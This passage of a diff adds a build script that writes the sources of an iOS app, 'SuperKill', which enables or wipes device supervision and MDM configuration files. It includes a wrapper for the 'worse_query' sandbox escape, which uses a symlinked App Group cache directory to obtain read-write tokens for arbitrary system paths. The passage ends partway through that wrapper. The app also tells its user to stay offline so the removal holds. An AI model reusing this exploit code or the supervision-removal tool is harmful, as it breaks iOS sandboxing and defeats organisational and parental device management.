+              [out appendFormat:@"监管: %@ → %@\n", [self valueText:lSup], [self valueText:rSup]];
+
+              NSArray<NSString *> *roots = @[SKConfigurationProfilesRoot, SKDeviceManagementRoot, SKUserProfilesRoot];
+              for (NSString *root in roots) {
+                  NSDictionary *l = leftRoots[root];
+                  NSDictionary *r = rightRoots[root];
+                  if (!l && !r) continue;
+
+                  [out appendFormat:@"\n[%@]\n", root.lastPathComponent];
+
+                  if (!l || !r) {
+                      [out appendString:@"  只有一侧存在快照，跳过\n"];
+                      continue;
+                  }
+
+                  BOOL lAvailable = [l[@"available"] boolValue];
+                  BOOL rAvailable = [r[@"available"] boolValue];
+                  if (lAvailable != rAvailable) {
+                      [out appendFormat:@"  可用性: %@ → %@\n",
+                       lAvailable ? @"可读写" : @"不可用", rAvailable ? @"可读写" : @"不可用"];
+                  }
+
+                  [self appendEntriesDiffFrom:l[@"entries"] to:r[@"entries"] into:out];
+
+                  for (NSString *section in @[@"cloud", @"mdm", @"clientTruth"]) {
+                      [self appendValuesDiffFrom:l[section] to:r[section] section:section into:out];
+                  }
+
+                  id lOrdered = l[@"orderedProfiles"];
+                  id rOrdered = r[@"orderedProfiles"];
+                  if (![lOrdered isEqual:rOrdered]) {
+                      [out appendFormat:@"  orderedProfiles: %@ → %@\n",
+                       lOrdered ?: @"(无)", rOrdered ?: @"(无)"];
+                  }
+              }
+
+              return out;
+          }
+
+          - (NSString *)diffSnapshotChain {
+              NSFileManager *fm = [NSFileManager defaultManager];
+              NSString *dir = [self snapshotsRoot];
+              [fm createDirectoryAtPath:dir withIntermediateDirectories:YES attributes:nil error:NULL];
+
+              NSArray<NSString *> *names = [[fm contentsOfDirectoryAtPath:dir error:NULL]
+                                            sortedArrayUsingSelector:@selector(compare:)];
+              NSMutableArray<NSDictionary *> *snapshots = [NSMutableArray array];
+              for (NSString *name in names) {
+                  if (![name.pathExtension isEqualToString:@"plist"]) continue;
+                  id snapshot = SKReadPlist([dir stringByAppendingPathComponent:name]);
+                  if ([snapshot isKindOfClass:[NSDictionary class]]) [snapshots addObject:snapshot];
+              }
+
+              if (snapshots.count == 0) {
+                  [self log:@"还没有快照：先点 ⑧ 记录一份基线"];
+                  return @"";
+              }
+
+              NSMutableDictionary *current = [[self captureState] mutableCopy];
+              current[@"label"] = @"当前";
+
+              NSMutableString *out = [NSMutableString string];
+              for (NSUInteger i = 1; i < snapshots.count; i++) {
+                  [out appendString:[self diffFrom:snapshots[i - 1] to:snapshots[i]]];
+              }
+              [out appendString:[self diffFrom:snapshots.lastObject to:current]];
+
+              [out insertString:[NSString stringWithFormat:@"共 %lu 份快照，逐对比较 + 最新快照 vs 当前\n",
+                                 (unsigned long)snapshots.count]
+                        atIndex:0];
+              [self log:@"%@", out];
+              return out;
+          }
+
+          #pragma mark - 回滚
+
+          - (BOOL)restoreLatestBackup:(NSError **)error {
+              NSFileManager *fm = [NSFileManager defaultManager];
+              NSArray<NSString *> *dirs = [fm contentsOfDirectoryAtPath:[self backupsRoot] error:NULL];
+              NSString *latest = [dirs sortedArrayUsingSelector:@selector(compare:)].lastObject;
+              if (latest.length == 0) {
+                  if (error) {
+                      *error = [NSError errorWithDomain:@"SuperKill"
+                                                   code:3
+                                               userInfo:@{NSLocalizedDescriptionKey: @"没有可用备份"}];
+                  }
+                  return NO;
+              }
+
+              NSString *dir = [[self backupsRoot] stringByAppendingPathComponent:latest];
+              NSDictionary<NSString *, NSString *> *map = SKReadPlist([dir stringByAppendingPathComponent:@"roots.plist"]);
+              if (![map isKindOfClass:[NSDictionary class]] || map.count == 0) {
+                  if (error) {
+                      *error = [NSError errorWithDomain:@"SuperKill"
+                                                   code:4
+                                               userInfo:@{NSLocalizedDescriptionKey: @"备份清单损坏"}];
+                  }
+                  return NO;
+              }
+
+              NSInteger restored = 0;
+              for (NSString *slug in map) {
+                  NSString *target = map[slug];
+                  if (![self grantAccessTo:target]) continue;
+                  NSString *src = [dir stringByAppendingPathComponent:slug];
+                  for (NSString *name in [fm contentsOfDirectoryAtPath:src error:NULL]) {
+                      if ([name isEqualToString:@"roots.plist"]) continue;
+                      NSString *from = [src stringByAppendingPathComponent:name];
+                      NSString *to = [target stringByAppendingPathComponent:name];
+                      [fm removeItemAtPath:to error:NULL];
+                      if ([fm copyItemAtPath:from toPath:to error:NULL]) restored++;
+                  }
+                  [self log:@"↺ 已还原 %@", target.lastPathComponent];
+              }
+
+              [self log:@"✓ 回滚完成（%ld 项）：%@", (long)restored, latest];
+              return restored > 0;
+          }
+
+          @end
+          SK_EOF_04_SKENGINE_M
+          mkdir -p Sources
+          cat > Sources/SKMainViewController.h <<'SK_EOF_05_SKMAINVIEWCONTROLLER_H'
+          //
+          //  SKMainViewController.h
+          //  SuperKill
+          //
+
+          #import <UIKit/UIKit.h>
+
+          @interface SKMainViewController : UIViewController
+
+          @end
+          SK_EOF_05_SKMAINVIEWCONTROLLER_H
+          mkdir -p Sources
+          cat > Sources/SKMainViewController.m <<'SK_EOF_06_SKMAINVIEWCONTROLLER_M'
+          //
+          //  SKMainViewController.m
+          //  SuperKill
+          //
+          //  操作台：App Group → 自检 → 检测 → 备份 → 开启/清除监管 → 回滚。
+          //
+
+          #import "SKMainViewController.h"
+          #import "SKEngine.h"
+
+          static NSString *const SKOrgKey = @"SKOrgName";
+          static NSString *const SKEmailKey = @"SKOrgEmail";
+          static NSString *const SKURLKey = @"SKConfigURL";
+          static NSString *const SKWithMDMKey = @"SKWithMDM";
+
+          @interface SKMainViewController () <UITextFieldDelegate>
+
+          @property (nonatomic, strong) SKEngine *engine;
+          @property (nonatomic, strong) UITextField *groupField;
+          @property (nonatomic, strong) UITextField *orgField;
+          @property (nonatomic, strong) UITextField *emailField;
+          @property (nonatomic, strong) UITextField *urlField;
+          @property (nonatomic, strong) UISwitch *mdmSwitch;
+          @property (nonatomic, strong) UITextView *console;
+          @property (nonatomic, strong) UIActivityIndicatorView *spinner;
+          @property (nonatomic, strong) NSMutableString *logBuffer;
+          @property (nonatomic, strong) dispatch_queue_t workQueue;
+
+          @end
+
+          @implementation SKMainViewController
+
+          - (void)viewDidLoad {
+              [super viewDidLoad];
+
+              self.title = @"监管开关";
+              self.view.backgroundColor = [UIColor systemBackgroundColor];
+
+              self.engine = [[SKEngine alloc] init];
+              self.workQueue = dispatch_queue_create("cc.superkill.work", DISPATCH_QUEUE_SERIAL);
+              self.logBuffer = [NSMutableString string];
+
+              __weak typeof(self) weakSelf = self;
+              self.engine.logger = ^(NSString *line) {
+                  dispatch_async(dispatch_get_main_queue(), ^{
+                      [weakSelf appendLog:line];
+                  });
+              };
+
+              [self buildUI];
+              [self loadOptions];
+              [self appendLog:@"SuperKill ready：④ 清除监管，⑦ 开启监管，可来回切换做测试。"];
+              [self appendLog:@"建议：执行前打开飞行模式，执行后保持断网并重启设备。"];
+          }
+
+          #pragma mark - UI
+
+          - (UIButton *)makeButton:(NSString *)title action:(SEL)action destructive:(BOOL)destructive {
+              UIButtonConfiguration *config = [UIButtonConfiguration filledButtonConfiguration];
+              config.title = title;
+              config.cornerStyle = UIButtonConfigurationCornerStyleMedium;
+              if (destructive) {
+                  config.baseBackgroundColor = [UIColor systemRedColor];
+              }
+              UIButton *button = [UIButton buttonWithType:UIButtonTypeSystem];
+              button.configuration = config;
+              [button addTarget:self action:action forControlEvents:UIControlEventTouchUpInside];
+              [button.heightAnchor constraintGreaterThanOrEqualToConstant:44].active = YES;
+              return button;
+          }
+
+          - (UITextField *)makeField:(NSString *)placeholder {
+              UITextField *field = [[UITextField alloc] init];
+              field.borderStyle = UITextBorderStyleRoundedRect;
+              field.placeholder = placeholder;
+              field.autocapitalizationType = UITextAutocapitalizationTypeNone;
+              field.autocorrectionType = UITextAutocorrectionTypeNo;
+              field.keyboardType = UIKeyboardTypeURL;
+              field.delegate = self;
+              field.returnKeyType = UIReturnKeyDone;
+              field.font = [UIFont systemFontOfSize:14];
+              [field.heightAnchor constraintEqualToConstant:40].active = YES;
+              return field;
+          }
+
+          - (UILabel *)makeSectionLabel:(NSString *)text {
+              UILabel *label = [[UILabel alloc] init];
+              label.text = text;
+              label.font = [UIFont preferredFontForTextStyle:UIFontTextStyleFootnote];
+              label.textColor = [UIColor secondaryLabelColor];
+              return label;
+          }
+
+          - (void)buildUI {
+              UIStackView *root = [[UIStackView alloc] init];
+              root.axis = UILayoutConstraintAxisVertical;
+              root.spacing = 10;
+              root.translatesAutoresizingMaskIntoConstraints = NO;
+              [self.view addSubview:root];
+
+              UILayoutGuide *guide = self.view.safeAreaLayoutGuide;
+              [NSLayoutConstraint activateConstraints:@[
+                  [root.topAnchor constraintEqualToAnchor:guide.topAnchor constant:12],
+                  [root.leadingAnchor constraintEqualToAnchor:guide.leadingAnchor constant:16],
+                  [root.trailingAnchor constraintEqualToAnchor:guide.trailingAnchor constant:-16],
+                  [root.bottomAnchor constraintEqualToAnchor:guide.bottomAnchor constant:-12],
+              ]];
+
+              // 上半部分可滚动，小屏也不会被挤爆
+              UIScrollView *scroll = [[UIScrollView alloc] init];
+              scroll.keyboardDismissMode = UIScrollViewKeyboardDismissModeInteractive;
+              scroll.alwaysBounceVertical = YES;
+              scroll.translatesAutoresizingMaskIntoConstraints = NO;
+
+              UIStackView *controls = [[UIStackView alloc] init];
+              controls.axis = UILayoutConstraintAxisVertical;
+              controls.spacing = 8;
+              controls.translatesAutoresizingMaskIntoConstraints = NO;
+              [scroll addSubview:controls];
+              [NSLayoutConstraint activateConstraints:@[
+                  [controls.topAnchor constraintEqualToAnchor:scroll.contentLayoutGuide.topAnchor],
+                  [controls.bottomAnchor constraintEqualToAnchor:scroll.contentLayoutGuide.bottomAnchor],
+                  [controls.leadingAnchor constraintEqualToAnchor:scroll.contentLayoutGuide.leadingAnchor],
+                  [controls.trailingAnchor constraintEqualToAnchor:scroll.contentLayoutGuide.trailingAnchor],
+                  [controls.widthAnchor constraintEqualToAnchor:scroll.frameLayoutGuide.widthAnchor],
+              ]];
+
+              // App Group
+              UIStackView *groupRow = [[UIStackView alloc] init];
+              groupRow.axis = UILayoutConstraintAxisHorizontal;
+              groupRow.spacing = 8;
+              self.groupField = [self makeField:@"group.cc.yourteam.superkill"];
+              UIButton *save = [self makeButton:@"保存" action:@selector(saveGroup) destructive:NO];
+              [save.widthAnchor constraintEqualToConstant:72].active = YES;
+              [groupRow addArrangedSubview:self.groupField];
+              [groupRow addArrangedSubview:save];
+
+              [controls addArrangedSubview:[self makeSectionLabel:@"签名里的 App Group"]];
+              [controls addArrangedSubview:groupRow];
+              [controls addArrangedSubview:[self makeButton:@"① 自检（系统 / Group / 逃逸可用性）" action:@selector(runEnvironment) destructive:NO]];
+              [controls addArrangedSubview:[self makeButton:@"② 检测监管状态" action:@selector(runInspect) destructive:NO]];
+              [controls addArrangedSubview:[self makeButton:@"③ 备份配置目录" action:@selector(runBackup) destructive:NO]];
+              [controls addArrangedSubview:[self makeButton:@"⑧ 记录状态快照（基线 / 开启后 / 清除后）" action:@selector(promptSnapshot) destructive:NO]];
+
+              // 开启监管参数
+              [controls addArrangedSubview:[self makeSectionLabel:@"开启监管（测试用）参数"]];
+              self.orgField = [self makeField:@"组织名，例如 Test Organization"];
+              self.emailField = [self makeField:@"组织邮箱（可空）"];
+              self.emailField.keyboardType = UIKeyboardTypeEmailAddress;
+              self.urlField = [self makeField:@"ConfigurationURL"];
+              [controls addArrangedSubview:self.orgField];
+              [controls addArrangedSubview:self.emailField];
+              [controls addArrangedSubview:self.urlField];
+
+              UIStackView *mdmRow = [[UIStackView alloc] init];
+              mdmRow.axis = UILayoutConstraintAxisHorizontal;
+              mdmRow.spacing = 8;
+              mdmRow.alignment = UIStackViewAlignmentCenter;
+              UILabel *mdmLabel = [self makeSectionLabel:@"同时写入 MDM.plist 占位"];
+              mdmLabel.textColor = [UIColor labelColor];
+              self.mdmSwitch = [[UISwitch alloc] init];
+              [mdmRow addArrangedSubview:mdmLabel];
+              [mdmRow addArrangedSubview:self.mdmSwitch];
+              [controls addArrangedSubview:mdmRow];
+
+              [controls addArrangedSubview:[self makeButton:@"⑦ 开启监管（写入并校验）" action:@selector(confirmEnable) destructive:NO]];
+              [controls addArrangedSubview:[self makeButton:@"④ 彻底清除监管" action:@selector(confirmWipe) destructive:YES]];
+              [controls addArrangedSubview:[self makeButton:@"⑤ 温和补丁（保留 profile）" action:@selector(runPatch) destructive:NO]];
+              [controls addArrangedSubview:[self makeButton:@"⑨ 对比快照链（含当前状态）" action:@selector(runDiff) destructive:NO]];
+              [controls addArrangedSubview:[self makeButton:@"⑥ 回滚最新备份" action:@selector(confirmRestore) destructive:NO]];
+              [controls addArrangedSubview:[self makeButton:@"释放全部扩展" action:@selector(runRelease) destructive:NO]];
+
+              self.spinner = [[UIActivityIndicatorView alloc] initWithActivityIndicatorStyle:UIActivityIndicatorViewStyleMedium];
+              self.spinner.hidesWhenStopped = YES;
+              [controls addArrangedSubview:self.spinner];
+
+              self.console = [[UITextView alloc] init];
+              self.console.editable = NO;
+              self.console.font = [UIFont monospacedSystemFontOfSize:11 weight:UIFontWeightRegular];
+              self.console.backgroundColor = [UIColor secondarySystemBackgroundColor];
+              self.console.layer.cornerRadius = 8;
+              self.console.textContainerInset = UIEdgeInsetsMake(8, 8, 8, 8);
+              [self.console.heightAnchor constraintEqualToConstant:190].active = YES;
+
+              [root addArrangedSubview:scroll];
+              [root addArrangedSubview:self.console];
+
+              UITapGestureRecognizer *tap = [[UITapGestureRecognizer alloc] initWithTarget:self action:@selector(dismissKeyboard)];
+              tap.cancelsTouchesInView = NO;
+              [self.view addGestureRecognizer:tap];
+          }
+
+          - (void)dismissKeyboard {
+              [self.view endEditing:YES];
+          }
+
+          #pragma mark - 参数持久化
+
+          - (void)loadOptions {
+              NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
+              self.groupField.text = [SKEngine configuredAppGroup];
+
+              NSString *org = [defaults stringForKey:SKOrgKey];
+              self.orgField.text = org.length ? org : @"Test Organization";
+
+              self.emailField.text = [defaults stringForKey:SKEmailKey] ?: @"";
+
+              NSString *url = [defaults stringForKey:SKURLKey];
+              self.urlField.text = url.length ? url : @"https://mdm.invalid/profile";
+
+              self.mdmSwitch.on = [defaults boolForKey:SKWithMDMKey];
+          }
+
+          - (void)persistOptions {
+              NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
+              [defaults setObject:(self.orgField.text ?: @"") forKey:SKOrgKey];
+              [defaults setObject:(self.emailField.text ?: @"") forKey:SKEmailKey];
+              [defaults setObject:(self.urlField.text ?: @"") forKey:SKURLKey];
+              [defaults setBool:self.mdmSwitch.on forKey:SKWithMDMKey];
+              [defaults synchronize];
+          }
+
+          - (void)saveGroup {
+              [self.groupField resignFirstResponder];
+              NSString *group = [self.groupField.text stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]];
+              [SKEngine setConfiguredAppGroup:group];
+              self.engine.appGroup = group;
+              [self persistOptions];
+              [self appendLog:[NSString stringWithFormat:@"App Group 已保存: %@", group.length ? group : @"(空)"]];
+          }
+
+          - (BOOL)textFieldShouldReturn:(UITextField *)textField {
+              [self saveGroup];
+              return YES;
+          }
+
+          #pragma mark - 日志 / 忙碌状态
+
+          - (void)appendLog:(NSString *)line {
+              NSDateFormatter *formatter = [[NSDateFormatter alloc] init];
+              formatter.dateFormat = @"HH:mm:ss";
+              NSString *stamp = [formatter stringFromDate:[NSDate date]];
+              NSString *entry = [NSString stringWithFormat:@"[%@] %@\n", stamp, line];
+              [self.logBuffer appendString:entry];
+              self.console.text = self.logBuffer;
+              if (self.console.text.length > 0) {
+                  NSRange end = NSMakeRange(self.console.text.length - 1, 1);
+                  [self.console scrollRangeToVisible:end];
+              }
+          }
+
+          - (void)setBusy:(BOOL)busy {
+              self.view.userInteractionEnabled = !busy;
+              if (busy) [self.spinner startAnimating];
+              else [self.spinner stopAnimating];
+          }
+
+          - (void)runInBackground:(void (^)(void))block {
+              [self setBusy:YES];
+              dispatch_async(self.workQueue, ^{
+                  @autoreleasepool {
+                      block();
+                  }
+                  dispatch_async(dispatch_get_main_queue(), ^{
+                      [self setBusy:NO];
+                  });
+              });
+          }
+
+          - (void)alert:(NSString *)title message:(NSString *)message {
+              UIAlertController *alert = [UIAlertController alertControllerWithTitle:title
+                                                                             message:message
+                                                                      preferredStyle:UIAlertControllerStyleAlert];
+              [alert addAction:[UIAlertAction actionWithTitle:@"好" style:UIAlertActionStyleDefault handler:nil]];
+              [self presentViewController:alert animated:YES completion:nil];
+          }
+
+          - (void)confirm:(NSString *)title
+                  message:(NSString *)message
+               actionName:(NSString *)actionName
+               destructive:(BOOL)destructive
+                  handler:(void (^)(void))handler {
+              UIAlertController *sheet = [UIAlertController alertControllerWithTitle:title
+                                                                            message:message
+                                                                     preferredStyle:UIAlertControllerStyleActionSheet];
+              [sheet addAction:[UIAlertAction actionWithTitle:actionName
+                                                        style:destructive ? UIAlertActionStyleDestructive : UIAlertActionStyleDefault
+                                                      handler:^(UIAlertAction *action) {
+                  handler();
+              }]];
+              [sheet addAction:[UIAlertAction actionWithTitle:@"取消" style:UIAlertActionStyleCancel handler:nil]];
+              sheet.popoverPresentationController.sourceView = self.view;
+              sheet.popoverPresentationController.sourceRect = self.view.bounds;
+              [self presentViewController:sheet animated:YES completion:nil];
+          }
+
+          #pragma mark - Actions
+
+          - (void)runEnvironment {
+              [self saveGroup];
+              [self runInBackground:^{
+                  SKEngine *engine = self.engine;
+                  SKLogBlock logger = engine.logger;
+                  if (logger) logger([engine environmentReport]);
+              }];
+          }
+
+          - (void)runInspect {
+              [self saveGroup];
+              [self runInBackground:^{
+                  [self.engine inspectSupervision];
+                  NSInteger state = [self.engine supervisedState];
+                  dispatch_async(dispatch_get_main_queue(), ^{
+                      NSString *text = state > 0 ? @"设备处于监管状态（IsSupervised = true）"
+                                                : (state == 0 ? @"未检测到监管标记" : @"无法判定");
+                      [self appendLog:text];
+                  });
+              }];
+          }
+
+          - (void)runBackup {
+              [self saveGroup];
+              [self runInBackground:^{
+                  NSError *error = nil;
+                  NSString *path = [self.engine backup:&error];
+                  if (!path) {
+                      dispatch_async(dispatch_get_main_queue(), ^{
+                          [self alert:@"备份失败" message:error.localizedDescription ?: @"未知错误"];
+                      });
+                  }
+              }];
+          }
+
+          - (void)promptSnapshot {
+              UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"记录状态快照"
+                                                                             message:@"给这次快照起名，diff 里会用它做标题（基线 / 开启后 / 清除后 …）"
+                                                                      preferredStyle:UIAlertControllerStyleAlert];
+              [alert addTextFieldWithConfigurationHandler:^(UITextField *textField) {
+                  textField.placeholder = @"基线";
+                  textField.text = @"基线";
+                  textField.autocorrectionType = UITextAutocorrectionTypeNo;
+              }];
+              [alert addAction:[UIAlertAction actionWithTitle:@"记录"
+                                                        style:UIAlertActionStyleDefault
+                                                      handler:^(UIAlertAction *action) {
+                  NSString *label = alert.textFields.firstObject.text;
+                  [self saveGroup];
+                  [self runInBackground:^{
+                      [self.engine captureSnapshotWithLabel:label];
+                  }];
+              }]];
+              [alert addAction:[UIAlertAction actionWithTitle:@"取消" style:UIAlertActionStyleCancel handler:nil]];
+              [self presentViewController:alert animated:YES completion:nil];
+          }
+
+          - (void)runDiff {
+              [self saveGroup];
+              [self runInBackground:^{
+                  [self.engine diffSnapshotChain];
+              }];
+          }
+
+          - (void)confirmEnable {
+              [self saveGroup];
+              [self persistOptions];
+
+              NSString *org = self.orgField.text.length ? self.orgField.text : @"Test Organization";
+              NSString *email = self.emailField.text ?: @"";
+              NSString *url = self.urlField.text.length ? self.urlField.text : @"https://mdm.invalid/profile";
+              BOOL withMDM = self.mdmSwitch.on;
+
+              NSString *message = [NSString stringWithFormat:
+                                   @"将写入 CloudConfigurationDetails.plist：\n"
+                                   @"IsSupervised = true\n组织 = %@\n邮箱 = %@\nURL = %@\n"
+                                   @"MDM.plist 占位 = %@\n\n重启后设置首页会显示“此 iPhone 受监管”。",
+                                   org, email.length ? email : @"(空)", url, withMDM ? @"写" : @"不写"];
+
+              [self confirm:@"开启监管（测试）"
+                    message:message
+                 actionName:@"写入并校验"
+                destructive:NO
+                    handler:^{
+                  [self performEnableWithOrganization:org email:email url:url withMDM:withMDM];
+              }];
+          }
+
+          - (void)performEnableWithOrganization:(NSString *)org
+                                          email:(NSString *)email
+                                            url:(NSString *)url
+                                        withMDM:(BOOL)withMDM {
+              [self runInBackground:^{
+                  NSError *error = nil;
+                  BOOL ok = [self.engine enableSupervisionWithOrganization:org
+                                                                    email:email
+                                                         configurationURL:url
+                                                                  withMDM:withMDM
+                                                                    error:&error];
+                  dispatch_async(dispatch_get_main_queue(), ^{
+                      [self alert:ok ? @"已开启（待重启生效）" : @"开启失败"
+                                  message:ok ? @"监管标记已落盘并读回校验通过。重启设备后：设置首页显示“此 iPhone 受监管”，② 检测会显示 IsSupervised = 1。之后可用 ④ 彻底清除来回切。"
+                                             : (error.localizedDescription ?: @"未知错误")];
+                  });
+              }];
+          }
+
+          - (void)confirmWipe {
+              [self confirm:@"彻底清除监管"
+                    message:@"将删除 CloudConfigurationDetails.plist、MDM.plist、MDMEvents.plist、MDMAppManagement.plist、PayloadManifest 条目与全部 GUID.stub，并清空 DeviceManagement 下的状态。建议先做 ③ 备份。"
+                 actionName:@"继续（彻底）"
+                destructive:YES
+                    handler:^{
+                  [self performWipe];
+              }];
+          }
+
+          - (void)performWipe {
+              [self runInBackground:^{
+                  NSError *error = nil;
+                  BOOL ok = [self.engine wipeSupervision:YES error:&error];
+                  dispatch_async(dispatch_get_main_queue(), ^{
+                      [self alert:ok ? @"已清除" : @"清除失败"
+                                  message:ok ? @"保持飞行模式，重启设备后再联网验证：设置 → 通用 → VPN 与设备管理 中不应再有 MDM 描述文件，设置首页不应再显示“此 iPhone 受监管”。"
+                                             : (error.localizedDescription ?: @"未知错误")];
+                  });
+              }];
+          }
+
+          - (void)runPatch {
+              [self saveGroup];
+              [self runInBackground:^{
+                  NSError *error = nil;
+                  BOOL ok = [self.engine patchSupervision:&error];
+                  dispatch_async(dispatch_get_main_queue(), ^{
+                      if (!ok) {
+                          [self alert:@"补丁未生效" message:error.localizedDescription ?: @"没有可改写的字段"];
+                      }
+                  });
+              }];
+          }
+
+          - (void)confirmRestore {
+              [self confirm:@"回滚"
+                    message:@"用最新一份备份覆盖当前配置目录。"
+                 actionName:@"回滚"
+                destructive:YES
+                    handler:^{
+                  [self runInBackground:^{
+                      NSError *error = nil;
+                      BOOL ok = [self.engine restoreLatestBackup:&error];
+                      dispatch_async(dispatch_get_main_queue(), ^{
+                          if (!ok) [self alert:@"回滚失败" message:error.localizedDescription ?: @"未知错误"];
+                      });
+                  }];
+              }];
+          }
+
+          - (void)runRelease {
+              [self runInBackground:^{
+                  [self.engine releaseAllExtensions];
+              }];
+          }
+
+          @end
+          SK_EOF_06_SKMAINVIEWCONTROLLER_M
+          mkdir -p Sources
+          cat > Sources/worse_query.h <<'SK_EOF_07_WORSE_QUERY_H'
+          //
+          //  worse_query.h
+          //  SuperKill
+          //
+          //  worse_query 沙盒逃逸原语的可用封装（面向 iOS 26.0 - 26.7.2 / 27.2）。
+          //  上游 PoC: https://github.com/forcequitOS/worse_query (GPL-3.0)
+          //
+          //  原理：把 App Group 容器里的 Library/Caches 换成指向目标路径的符号链接，
+          //  再让 containermanagerd 为该 group 的 "Library/Caches" part 签发 sandbox token。
+          //  containermanagerd 在签发前会解析符号链接，于是 token 实际覆盖的是目标路径，
+          //  进程 consume 之后即获得该任意路径（含 SystemGroup 系统组容器）的读写权限。
+          //
+
+          #ifndef worse_query_h
+          #define worse_query_h
+
+          #import <Foundation/Foundation.h>
+          #include <stdint.h>
+          #include <stdbool.h>
+
+          /// 取得 target 路径的 sandbox extension。
+          ///
+          /// @param target     目标路径（目录或文件，必须已存在，除非 create_dir 为 true）
+          /// @param group      自己签名里带的 App Group identifier，例如 group.cc.team.superkill
+          /// @param create_dir 目标不存在时是否仍然签发
+          /// @param flags_used 可空；返回本次成功的 container_query flags
+          ///
+          /// @return >0 扩展句柄（后续用 sk_escape_release 释放）
+          ///         -1  App Group 不存在（签名未注入 entitlements，或 group 未在门户注册）
+          ///         -2  符号解析失败（系统版本不受支持 / dylib 不在）
+          ///         -3  container_query_create 失败
+          ///         -4  符号链接创建失败
+          ///         -5  containermanagerd 拒绝 query
+          ///         -6  内核拒绝签发 / consume 失败
+          ///         -255 目标路径不存在
+          int64_t sk_escape(NSString *target, NSString *group, bool create_dir, int64_t *flags_used);
+
+          /// 释放扩展。传入 <=0 时安全无操作。
+          void sk_escape_release(int64_t handle);
+
+          /// 该 group 在当前进程里是否存在可用的容器（用于自检）。
+          BOOL sk_has_app_group(NSString *group);
+
+          #endif /* worse_query_h */
+          SK_EOF_07_WORSE_QUERY_H
+          mkdir -p Sources
+          cat > Sources/worse_query.m <<'SK_EOF_08_WORSE_QUERY_M'
+          //
+          //  worse_query.m
+          //  SuperKill
+          //
+          //  worse_query 原语的增强封装。相对上游的改动：
+          //    1. 自动枚举 flags × identifier 形态四种组合（iOS 26 的 AppGroup 需要 0x0800000000；
+          //       部分版本对 group identifiers 只接受 xpc array），不再由调用方判断系统版本。
+          //    2. 预检查区分 ENOENT 与 EPERM：沙盒不让 stat 的路径照样去试签发。
+          //    3. 补齐 container_* 的 dlsym 回退（dylib 打开失败时退到 RTLD_DEFAULT）。
+          //    4. 统一错误码 + 每次尝试后清理符号链接，不污染自己的 App Group 容器。
+          //
+
+          #import "worse_query.h"
+
+          #import <Foundation/Foundation.h>
+          #import <dlfcn.h>
+          #import <errno.h>
+          #import <stdlib.h>
+          #import <sys/stat.h>
+          #import <xpc/xpc.h>
+
+          typedef void    *(*cq_create_fn)(void);
+          typedef void     (*cq_set_class_fn)(void *, uint64_t);
+          typedef void     (*cq_set_group_ids_fn)(void *, xpc_object_t);
+          typedef void     (*cq_set_flags_fn)(void *, uint64_t);
+          typedef void     (*cq_set_part_fn)(void *, uint64_t);
+          typedef void    *(*cq_get_single_fn)(void *);
+          typedef void     (*cq_free_fn)(void *);
+          typedef char    *(*cq_copy_token_fn)(void *);
+          typedef int64_t  (*sbx_consume_fn)(const char *);
+          typedef int      (*sbx_release_fn)(int64_t);
+
+          // container_query 常量（与 containermanagerd 私有 ABI 对齐）
+          #define SK_CQ_CLASS_APP_GROUP      7ULL   // 只走 appGroup 类，才会 XPC 到 containermanagerd
+          #define SK_CQ_PART_LIBRARY_CACHES  3ULL   // part 3 == Library/Caches，也就是被我们换成符号链接的那一级
+          #define SK_CQ_FLAGS_DEFAULT        0x0000008000000000ULL
+          #define SK_CQ_FLAGS_IOS26_APPGROUP 0x0000000800000000ULL
+
+          static const char *const kContainerManagerPath = "/usr/lib/system/libsystem_containermanager.dylib";
+
+          static void *sk_sym(void *image, const char *name) {
+              void *p = image ? dlsym(image, name) : NULL;
+              if (!p) p = dlsym(RTLD_DEFAULT, name);
+              return p;
+          }
+
+          BOOL sk_has_app_group(NSString *group) {
+              if (group.length == 0) return NO;
+              return [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:group] != nil;
+          }
+
+          // 把 App Group 的 Library/Caches 恢复成真实目录。
+          static void sk_cleanup_symlink(NSString *group) {
+              if (group.length == 0) return;
+              NSFileManager *fm = [NSFileManager defaultManager];
+              NSURL *root = [fm containerURLForSecurityApplicationGroupIdentifier:group];
+              if (!root) return;
+              NSString *caches = [[root URLByAppendingPathComponent:@"Library/Caches"] path];
+              [fm removeItemAtPath:caches error:NULL];
+              [fm createDirectoryAtPath:caches withIntermediateDirectories:NO attributes:nil error:NULL];
+          }
+
+          static xpc_object_t sk_make_identifiers(NSString *group, bool as_array) {
+              xpc_object_t identifier = xpc_string_create(group.UTF8String);
+              if (!as_array) return identifier;
+              // 数组会 retain 元素；ARC 下不需要（也不允许）手工 release，最多泄漏一个短字符串。
+              return xpc_array_create(&identifier, 1);
+          }
+
+          static int64_t sk_escape_once(NSString *target, NSString *group, uint64_t flags,
+                                        bool create_dir, bool array_ids) {
+              if (!create_dir) {
+                  struct stat st;
+                  if (lstat(target.fileSystemRepresentation, &st) != 0 && errno == ENOENT) {
+                      return -255; // 真的不存在
+                  }
+                  // EPERM / EACCES：沙盒不允许 stat 这个路径，但目标可能存在 —— 继续尝试签发。
+              }
+
+              NSFileManager *fm = [NSFileManager defaultManager];
+              NSURL *groupRoot = [fm containerURLForSecurityApplicationGroupIdentifier:group];
+              if (!groupRoot) return -1;
+
+              NSString *caches = [[groupRoot URLByAppendingPathComponent:@"Library/Caches"] path];
+
+              void *image = dlopen(kContainerManagerPath, RTLD_NOW | RTLD_LOCAL);
+
+              cq_create_fn        create      = (cq_create_fn)sk_sym(image, "container_query_create");
+              cq_set_class_fn     set_class   = (cq_set_class_fn)sk_sym(image, "container_query_set_class");
+              cq_set_group_ids_fn set_ids     = (cq_set_group_ids_fn)sk_sym(image, "container_query_set_group_identifiers");
+              cq_set_flags_fn     set_flags   = (cq_set_flags_fn)sk_sym(image, "container_query_operation_set_flags");
+              cq_set_part_fn      set_part    = (cq_set_part_fn)sk_sym(image, "container_query_operation_set_part");
+              cq_get_single_fn    get_single  = (cq_get_single_fn)sk_sym(image, "container_query_get_single_result");
+              cq_free_fn          free_query  = (cq_free_fn)sk_sym(image, "container_query_free");
+              cq_copy_token_fn    copy_token  = (cq_copy_token_fn)sk_sym(image, "container_copy_sandbox_token");
+              sbx_consume_fn      consume     = (sbx_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
+
+              if (!create || !set_class || !set_ids || !set_flags || !set_part ||
+                  !get_single || !free_query || !copy_token || !consume) {
+                  if (image) dlclose(image);
+                  return -2;
+              }
